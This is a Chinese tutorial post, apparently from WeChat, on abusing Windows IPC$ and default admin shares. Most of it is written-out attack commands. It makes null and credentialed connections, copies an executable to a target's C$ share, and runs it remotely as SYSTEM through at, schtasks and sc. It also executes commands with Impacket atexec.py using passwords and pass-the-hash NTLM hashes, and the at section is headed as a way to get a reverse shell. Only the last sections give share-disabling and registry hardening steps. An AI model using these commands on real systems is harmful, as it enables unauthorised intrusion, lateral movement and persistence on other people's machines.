> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/M6UeG420vp58Bt-UL7_Hnw)

**目录**

常见共享命令

IPC$

IPC$ 的利用条件

1：开启了 139、445 端口

2：目标主机开启了 IPC$ 共享

3：IPC 连接报错

IPC 空连接 

空连接可以做什么?(毫无作用)

IPC$ 非空连接

IPC$ 非空连接可以做什么？

dir 命令 (查看文件和目录)

tasklist 命令 (查看进程)

at 命令 (计划命令，可反弹 shell)

schtasks(计划任务)

Impacket 中的 atexec.py

关闭 IPC$ 共享及其他共享

IPC$ 连接失败的原因及常见错误号

连接失败原因

常见错误号

常见共享命令  

---------

```
net use                               #查看本机建立的连接(本机连接其他机器)
net session                           #查看本机建立的连接(其他机器连接的本机)，需要administrator用户执行
net share                             #查看本地开启的共享
net share ipc$                        #开启ipc$共享
net share ipc$ /del                   #删除ipc$共享
net share admin$ /del                 #删除admin$共享
net share c$ /del                     #删除C盘共享
net share d$ /del                     #删除D盘共享
net use * /del                        #删除所有连接

net use \\192.168.10.15                   #与192.168.10.15建立ipc空连接
net use \\192.168.10.15\ipc$              #与192.168.10.15建立ipc空连接
net use \\192.168.10.15\ipc$ /u:"" ""     #与192.168.10.15建立ipc空连接

net view \\192.168.10.15                  #查看远程主机开启的默认共享

net use \\192.168.10.15 /u:"administrator" "root"   #以administrator身份与192.168.10.15建立ipc连接
net use \\192.168.10.15 /del              #删除建立的ipc连接

net time \\192.168.10.15                  #查看该主机上的时间

net use \\192.168.10.15\c$  /u:"administrator" "root"  #建立C盘共享
dir \\192.168.10.15\c$                  #查看192.168.10.15C盘文件
dir \\192.168.10.15\c$\user             #查看192.168.10.15C盘文件下的user目录
dir \\192.168.10.15\c$\user\test.exe    #查看192.168.10.15C盘文件下的user目录下的test.exe文件
net use \\192.168.10.15\c$  /del        #删除该C盘共享连接

net use k: \\192.168.10.15\c$  /u:"administrator" "root"  #将目标C盘映射到本地K盘
net use k: /del                                           #删除该映射
```

IPC$
----

**IPC$** (Internet Process Connection) 是共享 “命名管道” 的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。IPC$ 是 NT2000 的一项新功能，它有一个特点，即在同一时间内，两个 IP 之间只允许建立一个连接。NT2000 在提供了 IPC$ 共享功能的同时，在初次安装系统时还打开了默认共享，即所有的逻辑共享 (C$、D$、E$……) 和系统目录共享(Admin$)。所有的这些初衷都是为了方便管理员的管理。但好的初衷并不一定有好的收效，一些别有用心者会利用 IPC$，访问共享资源，导出用户列表，并使用一些字典工具，进行密码探测。

为了配合 IPC 共享工作，Windows 操作系统（不包括 Windows 98 系列）在安装完成后，自动设置共享的目录为：C 盘、D 盘、E 盘、ADMIN 目录（C:\Windows）等，即为 ADMIN$、C$、D$、E$ 等，但要注意，这些共享是隐藏的，只有管理员能够对他们进行远程操作。

输入 net share 可以查看开启的共享。

输入 net share 可以查看开启的共享。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEITeNUVTOxf1RzVqdknMayoyRqtAq743ibmy3ib22R0yP3GIQVMDhBATXw/640?wx_fmt=png)

所有的共享都依赖于 139 或 445 端口。

IPC$ 的利用条件
----------

### 1：开启了 139、445 端口

首先我们来了解一些基础知识：

*   SMB: (Server Message Block) Windows 协议族，用于文件打印共享的服务；
    
*   NBT: (NETBios Over TCP/IP) 使用 137（UDP）138（UDP）139（TCP）端口实现基于 TCP/IP 协议的 NETBIOS 网络互联。
    
*   在 WindowsNT 中 SMB 基于 NBT 实现，即使用 139（TCP）端口；而在 Windows2000 中，SMB 除了基于 NBT 实现，还可以直接通过 445 端口实现
    

**对于 win2000 客户端（发起端）来说：**

*   如果在允许 NBT 的情况下连接服务器时，客户端会同时尝试访问 139 和 445 端口，如果 445 端口有响应，那么就发送 RST 包给 139 端口断开连接，用 455 端口进行会话，当 445 端口无响应时，才使用 139 端口，如果两个端口都没有响应，则会话失败；
    
*   如果在禁止 NBT 的情况下连接服务器时，那么客户端只会尝试访问 445 端口，如果 445 端口无响应，那么会话失败。
    

**对于 win2000 服务器端来说：**

*   如果允许 NBT, 那么 UDP 端口 137, 138, TCP 端口 139, 445 将开放（LISTENING）；
    
*   如果禁止 NBT，那么只有 445 端口开放。
    

我们建立的 IPC 会话对端口的选择同样遵守以上原则。显而易见，如果远程服务器没有监听或端口，会话对端口的选择同样遵守以上原则。显而易见，如果远程服务器没有监听 139 或 445 端口，IPC 会话是无法建立的。

### 2：目标主机开启了 IPC$ 共享

默认共享是为了方便管理员进行远程管理而默认开启的，包括所有的逻辑盘 (C$、D$ 等) 和系统目录 winnt 或 windows(admin$)以及 IPC$。这些共享默认是开启的。可以使用 net share 命令查看这些共享是否开启。

### 3：IPC 连接报错

如果目标主机没有开放 139 或 445 端口，我们去使用 IPC$ 连接的话，会提示找不到网络名。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIq5PkU4ibO5MdEJNDUmVSOVOJzDiaZXlV9YTUArJglnMhCGWkzk9RWdibA/640?wx_fmt=png)

IPC 空连接  

在介绍空会话之前，我们有必要了解一下一个安全会话是如何建立的。在 Windows NT 中，是使用 NTLM 挑战响应机制认证。传送门——>  NTLM 认证方式 (工作组环境中)

空会话是在没有信任的情况下与服务器建立的会话（即未提供用户名与密码）。那么建立空会话到底可以做什么呢？  
利用 IPC$，黑客甚至可以与目标主机建立一个空的连接，而无需用户名与密码 (当然, 对方机器必须开了 IPC$ 共享, 否则你是连接不上的)，而利用这个空的连接，连接者还可以得到目标主机上的用户列表 (不过负责的管理员会禁止导出用户列表的)。建立了一个空的连接后, 黑客可以获得不少的信息 (而这些信息往往是入侵中必不可少的), 访问部分共享, 如果黑客能够以某一个具有一定权限的用户身份登陆的话, 那么就会得到相应的权限。

**建立 IPC$ 空连接**

```
建立IPC空连接
net use \\192.168.10.15
或 net use \\192.168.10.15   /u:""  ""
或 net use \\192.168.10.15\ipc$  /u:""  ""
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIxQbAdNicauXsjMJ8xfUIR0FOFicKH0ibQ2iaZQVxK71kr8Oj4CEgrZD7Rw/640?wx_fmt=png)

### 空连接可以做什么?(毫无作用)

在 Windows2003 以后，空连接什么权限都没有，也就是说并没有太大实质的用处。有些主机的 Administrator 管理员的密码为空，那么我们可以尝试使用下面的命令进行连接，但是大多数情况下服务器都阻止了使用空密码进行连接。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEInfAZOmOT2wiacjPhVZIa12Dq191aov1zFvSMO2iaUPLd6DEJ5UZqUAGA/640?wx_fmt=png)

以前建立空会话可以获取一些有用的信息，但是现在空会话的权限很低，访问都被拒了

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEI20ySSEyoOy8hTE3BquS0XKa7JGQKp7FM0eqSP1Fbia9rMtSOUPHQr5g/640?wx_fmt=png)

IPC$ 非空连接
---------

```
建立IPC$非空连接
net use \\192.168.10.131  /u:"administrator"  "密码"
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIWlhOFz4LYpBqTM7N7iaNXXGVOuRbcB3Shj7ugBSZ1fd35f5xzEX9H0A/640?wx_fmt=png)

IPC$ 非空连接可以做什么？
---------------

*   使用管理员组内用户 (administrator 或其他管理员组内用户均可) 建立 IPC$ 连接，可以执行以下所有命令。
    
*   使用普通用户建立 IPC$ 连接，仅能执行查看时间命令：net time \192.168.10.131 ，其他命令均执行不了。
    

### dir 命令 (查看文件和目录)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIFYomTz6fiaarfd8464GFkQ89KrnTDqshp7yv8e4fhFaCfkL9ljGwWKA/640?wx_fmt=png)

也可以直接在文件管理用命令：\192.168.10.131\c$ 查看对应的文件及目录，也可以增删改查  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEI7JvxwlF3LjUVCR0k9cxjB4d7SLbbKZnnFVEYHibSfhW8UYrQZqh3W4w/640?wx_fmt=png)

### tasklist 命令 (查看进程)

```
tasklist /S 192.168.10.131 /U administrator -P 密码
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEI3ibkbwmvx8HhcGc4pk2GKWDMBuaOeSGiasYIVot22YJqkmtHuFWXW5JQ/640?wx_fmt=png)

### at 命令 (计划命令，可反弹 shell)

*   查看目标系统时间：net time \192.168.10.131
    
*   将本目录下的指定文件复制到目标系统中：copy vps.exe \192.168.10.131\c$
    
*   使用 at 创建计划任务：at \192.168.10.131 17:00:00 C:\vps.exe
    
*   清除 at 记录：at \192.168.10.131 作业 ID /delete
    
*   使用 at 命令执行，将执行结果写入本地文本文件，再使用 type 命令查看该文件的内容：at \192.168.10.131 17:00:00 cmd.exe /c "ipconfig > C:/1.txt"
    
*   查看生成的 1.txt 文件：type \192.168.10.131\C$\1.txt
    

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEI2Rbd1rWApI7zc6nngCA4qicKrdicW2UzvNgp9d6xeNicJRxfw8UEEXJTw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIMbTwKkUg7MoiagNVJJrUGiaGG7gpqBxMSMBHhBaQcWDWVXG2uvUcNTdw/640?wx_fmt=png)

### schtasks(计划任务)

Windows Vista、Windows Server 2008 及之后版本的操作系统已经弃用 at 命令，而转为用 schtasks 命令。schtasks 命令比 at 命令更灵活。在使用 schtasks 命令时，会在系统中留下日志文件：C:\Windows\Tasks\SchedLgU.txt

```
在目标主机上创建一个名为test的计划任务，启动程序为C:\vps.exe，启动权限为system，启动时间为每隔一小时启动一次
schtasks /create /s 192.168.10.131 /tn test /sc HOURLY /mo 1 /tr c:\vps.exe /ru system /f

其他启动时间参数：
/sc onlogon  用户登录时启动
/sc onstart  系统启动时启动
/sc onidle   系统空闲时启动

查询该test计划任务
schtasks /query | findstr test

启动该test计划任务
schtasks /run /s 192.168.10.131 /i /tn "test"

删除该test计划任务
schtasks /delete /s 192.168.10.131 /tn "test" /f

sc命令创建计划任务
copy test.exe \\192.168.10.20\c$
sc \\192.168.10.20 create test binpath= "c:\test.exe"
sc \\192.168.10.20 start test
sc \\192.168.10.20 del test
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIpjvXYAfffAZE0NaVK52eHWxia0fO7U5ul0DaPR2icXVEjphuZoE4gyCA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIwyic9hhTUxKUbHYoJR2sVgeBNZJEbLY0Mxjrjh4rjjFUyJUDjZQyicTg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEI18N29PWDH1sd8GUwk3mWruMNbibEp0fIxn5dCbE5u0f0X8UIz7FcWhA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIOWRf0laic2IzOoeDhQeiaOQ9jCJE0FoyOKYVPgu3mUUCiagJPwzic83u8g/640?wx_fmt=png)

### Impacket 中的 atexec.py

Impacket 中的 atexec.py 脚本，就是利用定时任务获取权限，该脚本的利用需要开启 ipc$ 共享。这个脚本仅工作 Windows>=Vista 的系统上。这个样例能够通过任务计划服务（Task Scheduler）来在目标主机上实现命令执行，并返回命令执行后的输出结果 。

```
./atexec.py  xie/hack:x123456./@192.168.10.130  whoami
 ./atexec.py  xie/hack:@192.168.10.130  whoami  -hashes aada8eda23213c027743e6c498d751aa:b98e75b5ff7a3d3ff05e07f211ebe7a8
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEI51jsrYIZzwQ1ursUjtCghD8XbAAXDKckgWUZXusJuLMOcX7yJQUc0A/640?wx_fmt=png)

关闭 IPC$ 共享及其他共享

既然 ipc$ 有一定的危险性，而且对于我们大多数人来说是没啥用的，所以我们执行以下命令关闭共享

1、使用命令关闭：

```
net  share  ipc$    /delete              关闭ipc默认共享
net  share  c$      /delete              关闭C盘默认共享
net  share  admin$  /delete              关闭admin$默认共享
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIZdAKkeI50huY9tdicD6YYa8zg5y9YeI7Sw7g1icS4gljKb23G1mByD9w/640?wx_fmt=png)

2、修改注册表关闭

限制 IPC$ 缺省共享：

*   HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Lsa
    
*   Name：restrictanonymous
    
*   Type：REG_DWORD
    
*   Value：0x0(缺省) 0x1 匿名用户无法列举本机用户列表 0x2 匿名用户无法连接本机 IPC$ 共享 说明: 不建议使用 2，否则可能会造成你的一些服务无法启动，如 SQL Server。
    

IPC$ 连接失败的原因及常见错误号
------------------

### 连接失败原因

*   用户名或密码错误
    
*   目标主机没有开启 IPC$ 共享
    
*   不能成功连接目标主机的 139、445 端口
    
*   命令输入错误
    

### 常见错误号

*   错误号 5：拒绝访问
    
*   错误号 51：Windows 无法找到网络路径，及网络中存在问题
    
*   错误号 53：找不到网络路径，包括 IP 地址错误、目标未开机、目标的 lanmanserver 服务未启动，目标防火墙过滤了端口
    
*   错误号 67：找不到网络名，包括 lanmanworkstation 服务未启动，IPC$ 已被删除
    
*   错误号 1219：提供的凭据与已存在的凭据集冲突。例如已经和目标建立了 IPC$ 连接，需要在删除后重新连接
    
*   错误号 1326：未知的用户名或错误的密码
    
*   错误号 1792：试图登录，但是网络登录服务没有启动，包括目标 NetLogon 服务未启动 (连接域控制器时会出现此情况)
    
*   错误号 2242：此用户的密码已经过期。
    

如果想跟我一起讨论，那快加入我的知识星球吧！ 

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cOYA2VPLdpWg6gMJHagTxXybayibUrw8O7lyCGVXibISZ0dChsd2MmRGg3YPL6r9gPIKb0eALicCszg/640?wx_fmt=png)

相关文章：[Windows 权限维持](http://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247488350&idx=1&sn=89cb7c773a84de57d461894f8df7b870&chksm=eaad9363ddda1a75146b601dbd0ff406148d25a0210e1222d6640810e3bb0857e3f5659d3fae&scene=21#wechat_redirect)

                  [Windows 系统安全 | 135、137、138、139 和 445 端口](http://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247487598&idx=1&sn=11632c90978ff047ea340ed327723db6&chksm=eaad9053ddda194540dfc0fd3a01038f12feb687fd5772b4dee20053382f8c3ed371643bbb28&scene=21#wechat_redirect)